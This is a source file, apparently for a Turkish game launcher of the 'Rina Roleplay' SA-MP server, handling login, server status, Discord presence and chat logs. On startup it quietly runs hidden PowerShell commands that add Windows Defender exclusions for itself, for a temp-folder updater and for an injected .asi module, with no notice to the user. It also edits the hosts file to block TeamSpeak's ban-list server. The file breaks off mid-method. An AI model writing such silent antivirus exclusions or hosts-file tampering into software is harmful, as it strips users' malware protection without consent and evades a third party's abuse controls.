using System;
using Rina.Client.Source_files;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.Management;
using System.Globalization;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Timers;
using DiscordRPC;

namespace Rina.Client
{

    partial class Client : MetroFramework.Forms.MetroForm
    {
        public DiscordRpcClient RPC_Client;
        public static long anti_play_flood;

        public string geciciyol;
        FolderBrowserDialog Klasor = new FolderBrowserDialog();

        public static int gameDetectSeconds;
        public static int gameDetectSAMPID;
        public System.Timers.Timer gameDetectTimer;

        public static long simdioyuncalistirildi;
        public static string duyuru_link;
        public static BackgroundWorker worker = new BackgroundWorker();

        int TogMove;
        int MValX;
        int MValY;

        public Client()
        {
            Globals.Client = this;

            InitializeComponent();

            notifyIcon1.MouseDoubleClick += notifyIcon1_MouseDoubleClick;
        }

        private void ShellRun(string command)
        {
            try
            {
                var elevated = new ProcessStartInfo("powershell")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Verb = "runas",
                    Arguments = " -Command " + command
                };

                Process.Start(elevated);
            }
            catch
            {

            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

        private void Client_Load(object sender, EventArgs e)
        {
            string tempklasoru = Path.GetTempPath();

            ShellRun(@"Add-MpPreference -ExclusionProcess 'Rina Roleplay.exe'");
            ShellRun(@"Add-MpPreference -ExclusionProcess 'Rina Roleplay.old.exe'");
            ShellRun(@"Add-MpPreference -ExclusionProcess 'Rina_Updater.exe'");
            ShellRun(@"Add-MpPreference -ExclusionPath '" + Process.GetCurrentProcess().MainModule.FileName + "'");
            ShellRun(@"Add-MpPreference -ExclusionPath '" + tempklasoru + "Rina_Updater.exe'");
                       
            RPC_Client = new DiscordRpcClient("500244781906132993");
            RPC_Client.Initialize();

            Globals.DiscordPlayTime = Timestamps.Now;
            RPCGuncelle();

            gameDetectTimer = new System.Timers.Timer();
            gameDetectTimer.Elapsed += new ElapsedEventHandler(gameDetectTimer_Tick);
            gameDetectTimer.Interval = 500;

            Durum.BackColor = System.Drawing.ColorTranslator.FromHtml("#171717");
            minimize.BackColor = Color.Transparent;

            acdurum.BackColor = System.Drawing.ColorTranslator.FromHtml("#171717");

            this.Style = MetroFramework.MetroColorStyle.Silver;
            this.metroTabPage1.BackColor = System.Drawing.ColorTranslator.FromHtml("#212121");
            this.metroTabPage2.BackColor = System.Drawing.ColorTranslator.FromHtml("#212121");
            this.metroTabPage3.BackColor = System.Drawing.ColorTranslator.FromHtml("#212121");
            this.metroTabPage4.BackColor = System.Drawing.ColorTranslator.FromHtml("#212121");
            this.metroTabPage5.BackColor = System.Drawing.ColorTranslator.FromHtml("#212121");
            this.metroTabPage6.BackColor = System.Drawing.ColorTranslator.FromHtml("#212121");
            this.metroTabControl1.SelectedIndex = 0;

            this.metroLabel1.BackColor = Color.Transparent;
            this.metroLabel1.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");

            this.karakteradlabel.BackColor = Color.Transparent;
            this.karakteradlabel.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");


            this.ayarbilgi.BackColor = Color.Transparent;
            this.ayarbilgi.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");


            this.duyuru.BackColor = System.Drawing.ColorTranslator.FromHtml("#111111");
            this.duyuru.ForeColor = System.Drawing.ColorTranslator.FromHtml("#ffffff");

            this.duyuru_alt.BackColor = System.Drawing.ColorTranslator.FromHtml("#111111");
            this.duyuru_alt.ForeColor = System.Drawing.ColorTranslator.FromHtml("#ffffff");

            versiyon.BackColor = Color.Transparent;
            versiyon.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
            versiyon.Text = Globals.CurrentVersion;

            oyunsuresi.BackColor = Color.Transparent;
            oyunsuresi.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
            oyunsuresi.Text = "";

            this.sunucudurumubaslik.BackColor = Color.Transparent;
            this.sunucudurumubaslik.ForeColor = System.Drawing.ColorTranslator.FromHtml("#ffffff");

            this.kisayollarbaslik.BackColor = Color.Transparent;
            this.kisayollarbaslik.ForeColor = System.Drawing.ColorTranslator.FromHtml("#ffffff");

            this.ayarlarbaslik.BackColor = Color.Transparent;
            this.ayarlarbaslik.ForeColor = System.Drawing.ColorTranslator.FromHtml("#ffffff");

            this.hataayiklamabaslik.BackColor = Color.Transparent;
            this.hataayiklamabaslik.ForeColor = System.Drawing.ColorTranslator.FromHtml("#ffffff");

            this.chatbaslik.BackColor = Color.Transparent;
            this.chatbaslik.ForeColor = System.Drawing.ColorTranslator.FromHtml("#ffffff");

            SunucuDurumuYenile();

            try
            {
                string uzaksunucudangelenduyuru = Functions.ReadTextFromUrl("http://" + Globals.RemoteClientSettings["webserverip"] + "/data/news.txt");
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://" + Globals.RemoteClientSettings["webserverip"] + "/data/news.png");
                request.UserAgent = Globals.AllowedUseragent;
                using (var response = request.GetResponse())
                using (var stream = response.GetResponseStream())
                {
                    pictureBox5.Image = Bitmap.FromStream(stream);
                }

                duyuru.Text = uzaksunucudangelenduyuru.Split('|')[0];
                duyuru_alt.Text = uzaksunucudangelenduyuru.Split('|')[1];
                duyuru_link = uzaksunucudangelenduyuru.Split('|')[2];
            }
            catch
            {
                duyuru.Text = "-";
                duyuru_alt.Text = "-";
                duyuru_link = "https://www.rina-roleplay.com";
            }

            Functions.LoadLocalSettings();
            Functions.CheckPath();
            BelgelerimOlustur();
            RefreshChatlogs();
            TS3Blacklist();

            string utilitypath = Globals.GamePath + @"\rina-utility.asi";
            ShellRun(@"Add-MpPreference -ExclusionPath '" + utilitypath + "'");
        }

        public void TS3Blacklist()
        {
            bool preventedBlacklist = false;
            string path = Globals.RootDrive + @"Windows\System32\drivers\etc\hosts";

            try
            {
                if (File.Exists(path))
                {
                    foreach (string line in File.ReadLines(path))
                    {
                        if (line.Contains("0.0.0.0 blacklist2.teamspeak.com"))
                        {
                            preventedBlacklist = true;
                            break;
                        }
                    }

                    if (!preventedBlacklist)
                    {
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine("0.0.0.0 blacklist2.teamspeak.com");
                            Globals.BlacklistSuccess = true;
                        }
                    }
                    else
                    {
                        Globals.BlacklistSuccess = true;
                    }
                }
            }
            catch
            {

            }
        }

        public void SunucuDurumuYenile()
        {
            string gelenveri = Functions.ReadTextFromUrl("http://"+ Globals.RemoteClientSettings["webserverip"] + "/data/sunucudurumu.php");

            try
            {
                sunucubilgi_1.BackColor = Color.Transparent;
                sunucubilgi_1.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");

                sunucubilgi_1.Text = "Kilit durumu: ";

                if (gelenveri.Split('|')[0] == "1")
                {
                    kilitbilgi.BackColor = Color.Transparent;
                    kilitbilgi.ForeColor = Color.Red;
                    kilitbilgi.Text = "Kilitli";

                }
                else
                {
                    kilitbilgi.BackColor = Color.Transparent;
                    kilitbilgi.ForeColor = Color.Green;
                    kilitbilgi.Text = "Kilitli Değil";
                }

                sunucubilgi_2.BackColor = Color.Transparent;
                sunucubilgi_2.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_2.Text = "Hesap sayısı: " + gelenveri.Split('|')[2];

                sunucubilgi_3.BackColor = Color.Transparent;
                sunucubilgi_3.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_3.Text = "Borsa: " + gelenveri.Split('|')[1] + " transaction";

                sunucubilgi_4.BackColor = Color.Transparent;
                sunucubilgi_4.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_4.Text = "Ekonomi: $" + gelenveri.Split('|')[3];

                sunucubilgi_5.BackColor = Color.Transparent;
                sunucubilgi_5.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_5.Text = "Son 24 saat: " + gelenveri.Split('|')[6] + " karakter";

                sunucubilgi_6.BackColor = Color.Transparent;
                sunucubilgi_6.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_6.Text = "Aktif oturum: " + gelenveri.Split('|')[4];

                sunucubilgi_7.BackColor = Color.Transparent;
                sunucubilgi_7.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_7.Text = "Discord online: " + gelenveri.Split('|')[5] + " kişi";

                sunucubilgi_8.BackColor = Color.Transparent;
                sunucubilgi_8.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_8.Text = "Yakıt: $" + gelenveri.Split('|')[7];

                sunucubilgi_9.BackColor = Color.Transparent;
                sunucubilgi_9.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_9.Text = "Son 24 saat: " + gelenveri.Split('|')[8] + " takas";

                sunucubilgi_10.BackColor = Color.Transparent;
                sunucubilgi_10.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_10.Text = "Giriş yapmış oyuncu: " + gelenveri.Split('|')[9] + " kişi";

                sunucubilgi_11.BackColor = Color.Transparent;
                sunucubilgi_11.ForeColor = System.Drawing.ColorTranslator.FromHtml("#c9c9c9");
                sunucubilgi_11.Text = "Bugün yeni katılan: " + gelenveri.Split('|')[10] + " kişi";
            }
            catch {
                MessageBoxWrapper.Show("Lütfen daha yavaş güncelleyiniz.", "Rina Roleplay");
            }
        }

        void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            StringBuilder sb = new StringBuilder();

            int i = 1;
            Process[] processList = Process.GetProcesses(".");
            foreach (Process p in processList)
            {
                try
                {
                    if (p.MainWindowTitle.Length > 0)
                    {

                        if (p.MainWindowTitle.Contains("GTA: San Andreas") || p.MainWindowTitle.Contains("GTA:SA:MP"))
                        {
                            Process[] proc = Process.GetProcessesByName(p.MainWindowTitle.ToString());

                            Durum.ForeColor = Color.Red;
                            Durum.Text = "GTA:SA açıkken giriş yapılamaz.";
                            return;
                        }

                        i++;

                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }

            Durum.ForeColor = Color.White;
            Durum.Text = "Kontroller sağlanıyor...";


            if (Functions.CheckForInternetConnection() == false)
            {
                Durum.ForeColor = Color.Red;
                Durum.Text = "Lütfen internet bağlantınızı kontrol edin.";
            }
            else if (textBox1.Text.Trim() == "")
            {
                Durum.ForeColor = Color.Red;
                Durum.Text = "Lütfen kutuyu boş girmeyiniz.";
            }
            else
            {
                int girisresult;

                Globals.RemoteClientSettings = Functions.GetRemoteSettings();

                if (Globals.RemoteClientSettings["version"] != Globals.CurrentVersion)
                {
                    Globals.Client.Hide();
                    Globals.Updater.Show();
                    Globals.Updater.StartUpdate();
                    return;
                }
              
                Durum.ForeColor = Color.Green;
                Durum.Text = "Giriş yapılıyor.";
                               
                if (!File.Exists(Globals.GamePath + @"\gta_sa.exe") || !File.Exists(Globals.GamePath + @"\samp.exe"))
                {
                    Durum.ForeColor = Color.Red;
                    Durum.Text = "Oyun dosyalarında gta_sa.exe veya samp.exe bulunamadı.";
                }
                else if (MessageBoxWrapper.IsOpen)
                {
                    Durum.ForeColor = Color.Red;
                    Durum.Text = "İlk önce uyarıları kapatın.";
                }
                else if (textBox1.Text.Trim().Length > 24)
                {
                    Durum.ForeColor = Color.Red;
                    Durum.Text = "İsminiz en fazla 24 karakter olabilir.";
                }
                else if ((girisresult = GirisEkle()) != 1)
                {
                    if (girisresult == 0)
                    {
                        Durum.Text = "Giriş yapılamadı, çok sık giriş yapamazsınız 15 saniye sonra tekrar deneyiniz.";
                    }
                    else if (girisresult == -1)
                    {
                        Durum.Text = "Bu isim kullanılamaz.";
                    }
                    else if (girisresult == -2)
                    {
                        Durum.Text = "IP/Network bağlantınızda bir problem bulundu. Sistem yöneticisiyle iletişime geçiniz.";
                    }

                    Durum.ForeColor = Color.Red;
                }
                else
                {
                    try
                    {
                        BeginInvoke(new Action(() =>
                        {
                            
                            foreach (var process in Process.GetProcessesByName("gta_sa")) // BUNU EKLİYORUZ ARKADA AÇILMAYAN GTA'LAR İÇİN
                            {
                                try { process.Kill(); } catch { }
                            }

                            anti_play_flood = UnixTimeNow() + 3;

                            try
                            {
                                var documentfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                                if (Directory.Exists(documentfolder + @"\GTA San Andreas User Files\SAMP\cache\"+ Globals.RemoteClientSettings["cacheoldip"] + ".7777") && !Directory.Exists(documentfolder + @"\GTA San Andreas User Files\SAMP\cache\" + Globals.RemoteClientSettings["cachenewip"] + ".7777"))
                                    Directory.Move(documentfolder + @"\GTA San Andreas User Files\SAMP\cache\" + Globals.RemoteClientSettings["cacheoldip"] + ".7777", documentfolder + @"\GTA San Andreas User Files\SAMP\cache\" + Globals.RemoteClientSettings["cachenewip"] + ".7777");

                                if (File.Exists(Globals.GamePath + @"\rina-discord.asi"))
                                    File.Delete(Globals.GamePath + @"\rina-discord.asi");
                            }
                            catch
                            {

                            }

                            Globals.GTAProcessID = 0;

                            Functions.AppendProcessID(Globals.LoginKey.ToString());
                            Process p = Process.Start(Globals.GamePath + @"\samp.exe", Globals.RemoteClientSettings["sampserverip"] + " " + "-nRina_Player");
                            Globals.DiscordPlayTime = Timestamps.Now;

                            Globals.LastName = textBox1.Text.Trim();
 
                            Durum.Text = "Oyun çalıştırıldı.";
                            simdioyuncalistirildi = 1;

                            Globals.FindGameRetryCount = 0;
                            Globals.ENBActivated = false;

                            gameDetectSAMPID = p.Id;
                            gameDetectSeconds = 0;

                            this.Invoke(new Action(this.gameDetectTimerStart));
                            this.Invoke(new Action(this.timer4Start));
                        }));
                    }
                    catch (Exception err)
                    {
                        Durum.Text = "Oyun çalıştırılamadı.";

                        MessageBox.Show(err.Message);
                    }
                }
            }
        }
        public void gameDetectTimerStart()
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(this.gameDetectTimerStart));
            }
            else
            {
                this.gameDetectTimer.Start();
            }
        }

        public void timer4Start()
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(this.timer4Start));
            }
            else
            {
                this.timer4.Start();
            }
        }

        public void gameDetectTimer_Tick(object sender, EventArgs e)
        {
            if (gameDetectSeconds >= 120) // 60 saniye 120 yazdığına bakma her timer ticki 500ms
            {
                gameDetectTimer.Stop();
                return;
            }

            Process[] processList = Process.GetProcesses(".");
            foreach (Process p in processList)
            {
                try
                {
                    if (p.MainWindowTitle.Length > 0)
                    {
                        if (p.MainWindowTitle.Contains("GTA: San Andreas") || p.MainWindowTitle.Contains("GTA:SA:MP"))
                        {
                            int parentprocessid = Functions.GetParentProcessID(p.Id);

                            if (parentprocessid == gameDetectSAMPID || parentprocessid == -1)
                            {
                                Functions.PutProcessID(p.Id);

                                Globals.GTAProcessID = p.Id + 1232;
                                Globals.RealProcessID = p.Id;

                                UpKey();

                                Functions.PutDebugText($"Oyun tespit edildi. (GTA-SA: {p.Id}, SA-MP: {gameDetectSAMPID})");

                                gameDetectTimer.Stop();
                                return;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }

            gameDetectSeconds++;
        }

        private void Client_FormClosing(object sender, FormClosingEventArgs e)
        {
            Functions.RemoveClientSession(213);
            this.Hide();

            Application.Exit();
        }

        private void Client_FormClosed(object sender, FormClosedEventArgs e)
        {
            Functions.SetRegeditName(textBox1.Text.Trim());
            try { Process.GetCurrentProcess().Kill(); } catch { }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
        private void myProcess_Exited(object sender, System.EventArgs e)
        {


        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            TogMove = 1;
            MValX = e.X;
            MValY = e.Y;
        }

        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            TogMove = 0;
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (TogMove == 1)
            {
                //this.SetDesktopLocation(MousePosition.X - MValX, MousePosition.Y - MValY);
            }
        }

        private void pictureBox3_Click_1(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.facebook.com/rinaroleplay/");

        }

        private void pictureBox2_Click_1(object sender, EventArgs e)
        {

            System.Diagnostics.Process.Start("https://www.youtube.com/channel/UCnNvd_LWorIx1gifAYD9iZQ");

        }

        private void pictureBox6_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://www.instagram.com/rinaroleplay/");
        }

        private void pictureBox4_Click_1(object sender, EventArgs e)
        {

            System.Diagnostics.Process.Start("https://www.rina-roleplay.com/discord");

        }

        public static bool IsGameRunning(string name)
        {
            return Process.GetProcessesByName(name).FirstOrDefault(p => p.MainModule.FileName.StartsWith("")) != default(Process);
        }

        private void copyright_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Kullandığınız program, Rina Roleplay oyun sunucusu için @Hera tarafından kodlanmıştır.\n\nTüm hakları Rina Roleplay'a aittir.");
        }

        private void Durum_Click(object sender, EventArgs e)
        {

        }

        private void istatistik3_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox7_Click(object sender, EventArgs e)
        {
            Durum.Text = "Client kapatılıyor...";
            Durum.ForeColor = Color.Red;

            this.Close();

            Application.Exit();
        }

        public bool OyunAcikmi()
        {
            Process[] processList = Process.GetProcesses(".");

            foreach (Process p in processList)
            {
                try
                {
                    if (p.MainWindowTitle.Length > 0)
                    {
                        if (p.MainWindowTitle.Contains("GTA: San Andreas") || p.MainWindowTitle.Contains("GTA:SA:MP"))
                        {
                            if (simdioyuncalistirildi == 1)
                            {
                                simdioyuncalistirildi = 0;
                            }
                            return true;
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            return false;
        }

        public static Process GetGTASAProcessHandle()
        {
            Process process = Process.GetProcesses(".").Where<Process>(p => p.MainWindowTitle.Contains("GTA: San Andreas") || p.MainWindowTitle.Contains("GTA:SA:MP") || p.ProcessName == "gta_sa").FirstOrDefault();

            if (process == null)
                return null;

            return process;
        }

        public static string GetGTASAProcessName()
        {
            Process[] processList = Process.GetProcesses(".");
            foreach (Process p in processList)
            {
                try
                {
                    if (p.MainWindowTitle.Length > 0)
                    {
                        if (p.MainWindowTitle.Contains("GTA: San Andreas") || p.MainWindowTitle.Contains("GTA:SA:MP"))
                        {
                            return p.ProcessName;
                        }
                    }
                }
                catch { }
            }
            return "null";
        }

        protected void UpKey()
        {
            if (!Globals.GameStartedByUser)
                return;

            BeginInvoke(new Action(() =>
            {
                try
                {
                    Functions.PutDebugText("Varlık hazırlanıyor.");
                    string str = string.Concat(new string[]
                    {
                        Globals.RegID,
                        "|",
                        Globals.LoginKey,
                        "|",
                        Globals.AliveUpdateCount.ToString(),
                        "|",
                        Globals.GTAProcessID.ToString()
                    });
                    string a = Functions.ReadTextFromUrl(Globals.PostUpdateURL + "?uq=" + str);
                    if (a == "lol")
                    {
                        Globals.AliveUpdateCount++;
                        Functions.PutDebugText("Varlığınız sunucuya bildirildi.");
                    }
                    else if (a == "gameclose")
                    {
                        Functions.GameClose(4455);
                        Durum.Text = "Oyununuz sunucu tarafından zorla kapatıldı, tekrar giriş yapmanız gerekebilir.";
                        Durum.ForeColor = Color.Red;
                    }
                }
                catch
                {

                }
            }));
        }

        public static long UnixTimeNow()
        {
            var timeSpan = (DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0));
            return (long)timeSpan.TotalSeconds;
        }

        private void pictureBox5_Click_1(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Minimized)
            {
                Hide();
                this.WindowState = FormWindowState.Minimized;
                notifyIcon1.Visible = true;
            }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            ClientiGoster();
        }

        public void ClientiGoster()
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.Show();
                this.WindowState = FormWindowState.Normal;
                this.notifyIcon1.Visible = false;
            }
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            if (Globals.ENBActivated)
            {
                timer4.Stop();
                return;
            }

            if (File.Exists(Globals.GamePath + "/d3d9.dll"))
            {
                string[] files = Directory.GetFiles(Globals.GamePath, "*.*");
                for (int i = 0; i < files.Length; i++)
                {
                    if (Path.GetFileName(files[i]).ToLower() == "d3d9.dll")
                    {
                        Globals.ENBActivated = true;
                        break;
                    }
                }
            }
            else
            {
                Globals.ENBActivated = false;
            }

            if (Globals.ENBActivated)
            {
                Durum.Text = "Oyun çalıştırıldı. (D3D9 entegreli)";
            }

            Globals.FindGameRetryCount++;
            if (Globals.FindGameRetryCount < 10)
            {
                timer4.Start();
                return;
            }

            timer4.Stop();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void istatistik2_Click(object sender, EventArgs e)
        {

        }


        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {


        }


        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            Thread backgroundWorker2_thread = new Thread(() =>
            {                
                if (OyunAcikmi())
                {
                    UpKey();
                }
            });

            backgroundWorker2_thread.Priority = ThreadPriority.Highest;
            backgroundWorker2_thread.Start();
        }

        public Process GetProcByID(int id)
        {
            Process[] processlist = Process.GetProcesses();
            return processlist.FirstOrDefault(pr => pr.Id == id);
        }

        private void anti_Suspend_DoWork(object sender, DoWorkEventArgs e)
        {
            BackgroundWorker worker = sender as BackgroundWorker;
            int delay = 1000; // 1 second;

            while (!worker.CancellationPending)
            {
                if (Globals.RealProcessID != 0)
                {
                    Process gamehandle = GetProcByID(Globals.RealProcessID);

                    if (gamehandle == null)
                    {
                        oyunsuresi.Text = "";
                        Globals.PlayTime = 0;
                        Globals.RealProcessID = 0;

                        if (Globals.GameStartedByUser)
                        {
                            Functions.RemoveClientSession(6712);
                            RPCGuncelle();
                        }

                        SaveChatlog();
                    }
                    else
                    {
                        Globals.PlayTime++;

                        var ts = TimeSpan.FromSeconds(Globals.PlayTime);
                        var output = ts.ToString(@"hh\:mm\:ss");

                        oyunsuresi.Text = "[" + output + "]";
                    }
                }

                Thread.Sleep(delay);
            }
            e.Cancel = true;
        }

        public void RPCGuncelle()
        {
            try
            {
                string state = "";
                int statemode = 0;
                Process handle = GetGTASAProcessHandle();

                if (handle == null)
                {
                    state = "Client ekranı";
                    statemode = 0;
                }
                else
                {
                    string isim = Globals.LastName.Replace("_", " ");

                    statemode = 1;

                    if (Globals.HideDiscordName == 1)
                        state = "Gizli - Oyunda";
                    else if (isim.Length > 0)
                        state = isim + " - Oyunda";
                    else
                        state = "Bilinmiyor - Oyunda";
                }

#if DEBUG
                    state = "DEBUG MODE";
#endif

                if (statemode != Globals.DiscordStateMode)
                {
                    RPC_Client.SetPresence(new RichPresence()
                    {
                        Details = "www.rina-roleplay.com",
                        State = state,
                        Timestamps = Globals.DiscordPlayTime,
                        Assets = new Assets()
                        {
                            LargeImageKey = "rina_logo",
                            LargeImageText = "Rina Roleplay oynuyor.",
                            SmallImageKey = "rina_logo"
                        }
                    });

                    Globals.DiscordStateMode = statemode;
                }
            }
            catch
            {

            }
        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click_1(object sender, EventArgs e)
        {

        }

        private void label8_Click_1(object sender, EventArgs e)
        {

        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void Client_Shown(object sender, EventArgs e)
        {
            Functions.PutDebugText("Client gösteriliyor.");

            Globals.Client.metroCheckBox1.Checked = Convert.ToBoolean(Globals.HideDiscordName);
            Globals.Client.metroCheckBox2.Checked = Convert.ToBoolean(Globals.ActiveChatLogs);
            
            Control.CheckForIllegalCrossThreadCalls = false;

            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Client_FormClosing);
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Client_FormClosed);
            this.MouseDown += new MouseEventHandler(pictureBox1_MouseDown);
            this.MouseUp += new MouseEventHandler(pictureBox1_MouseUp);
            this.MouseMove += new MouseEventHandler(pictureBox1_MouseMove);

            Durum.Text = "Client açıldı.";
            Durum.ForeColor = Color.White;

            acdurum.Text = Functions.GetComputerName();
            acdurum.ForeColor = Color.Green;

            anti_Suspend.RunWorkerAsync();

            textBox1.Text = Globals.SavedName.Trim();
                    
            worker.DoWork += new DoWorkEventHandler(worker_DoWork);

            textboxoyunyolu.Text = Globals.GamePath;
            geciciyol = Globals.GamePath;

            string ts3durum = "";
            if (Globals.BlacklistSuccess)
                ts3durum = "Başarılı";
            else
                ts3durum = "Başarısız";

            ayarbilgi.Text = "\nBilgilendirmeler:\n\nREGID: " + Globals.RegID + "\n";
            ayarbilgi.Text += "Teamspeak 3 Blacklist Koruması: " + ts3durum ;
        }

        public void StopGameDetectTimer()
        {
            gameDetectTimer.Stop();
        }

        private void metroTextBox1_Click(object sender, EventArgs e)
        {

        }

        private void metroTabPage1_Click(object sender, EventArgs e)
        {

        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            new StringBuilder();
            int num = 1;
            foreach (Process process in Process.GetProcesses("."))
            {
                try
                {
                    if (process.MainWindowTitle.Length > 0)
                    {
                        if (process.MainWindowTitle.Contains("GTA: San Andreas") || process.MainWindowTitle.Contains("GTA:SA:MP"))
                        {
                            Process.GetProcessesByName(process.MainWindowTitle.ToString());
                            MessageBox.Show("Bu işlemi yapabilmek için ilk önce oyunu kapatmalısınız.", "İşlem gerçekleştirilemedi", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                            return;
                        }
                        num++;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            if (!File.Exists(this.geciciyol + "/samp.exe") || !File.Exists(this.geciciyol + "/gta_sa.exe"))
            {
                MessageBox.Show("Seçilen klasörde SA-MP veya GTA:SA yok.");
                return;
            }
            if (Globals.GamePath == this.geciciyol)
            {
                MessageBox.Show("Herhangi bir ayar yapmadınız.");
                return;
            }
            string g_oyun = Globals.GamePath;
            Globals.GamePath = this.Klasor.SelectedPath;
            Registry.CurrentUser.OpenSubKey("Software\\SAMP\\", true).SetValue("gta_sa_exe", this.Klasor.SelectedPath);
            MessageBox.Show("Oyun yolunu başarıyla değiştirdiniz, clienti tekrar çalıştırmanız gerekmektedir.");
            Application.Exit();
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            Klasor.Description = "GTA-SA / SA-MP'nın kurulu olduğu klasörü seçiniz;";
            Klasor.ShowDialog();
            geciciyol = Klasor.SelectedPath;
            textboxoyunyolu.Text = geciciyol;
        }

        private void ayarbilgi_Click(object sender, EventArgs e)
        {
            try
            {
                Thread thread = new Thread(delegate ()
                {
                    Clipboard.SetText("REGID:" + Globals.RegID);
                });

                thread.SetApartmentState(ApartmentState.STA);
                thread.Start();
                thread.Join();
            }
            catch { }

            MessageBoxWrapper.Show("Client bilgileriniz panoya kopyalandı.", "Kopyalandı");
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            if (UnixTimeNow() < anti_play_flood)
            {
                Durum.Text = "3 saniyede bir bu butonu kullanabilirsiniz.";
                Durum.ForeColor = Color.Red;
                return;
            }

            if (!worker.IsBusy)
                worker.RunWorkerAsync();
        }

        private void metroTabPage4_Click(object sender, EventArgs e)
        {

        }

        public void BelgelerimOlustur()
        {
            var path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var subFolderPath = Path.Combine(path, "Rina Roleplay");

            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }

            var chatPath = Path.Combine(subFolderPath, "chatlogs");
            if (!Directory.Exists(chatPath))
            {
                Directory.CreateDirectory(chatPath);
            }
        }

        public void RefreshChatlogs()
        {
            listBox2.Items.Clear();

            var documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var subFolderPath = Path.Combine(documentsPath, @"Rina Roleplay\chatlogs");

            if (Directory.Exists(subFolderPath))
            {
                foreach (string path in Directory.EnumerateFiles(subFolderPath).Reverse())
                {
                    string extension = Path.GetExtension(path);

                    if (extension == ".log")
                    {
                        string filename = Path.GetFileName(path);
                        listBox2.Items.Add(filename);
                    }
                }
            }
        }

        public long GetLastChatLogLength()
        {
            try
            {
                var documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                var subFolderPath = Path.Combine(documentsPath, @"Rina Roleplay\chatlogs");

                if (Directory.Exists(subFolderPath))
                {
                    string path = Directory.EnumerateFiles(subFolderPath).Reverse().FirstOrDefault();

                    if (path == null)
                        return -1;

                    return new System.IO.FileInfo(path).Length;
                }
            } catch { }
            return -1;
        }

        public void SaveChatlog()
        {
            try
            {
                int refresh = 0;

                var documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                var sampLogPath = Path.Combine(documentsPath, @"GTA San Andreas User Files\SAMP");
                var rinalogsPath = Path.Combine(documentsPath, @"Rina Roleplay\chatlogs");

                if (listBox2.Items.Count >= 250)
                {
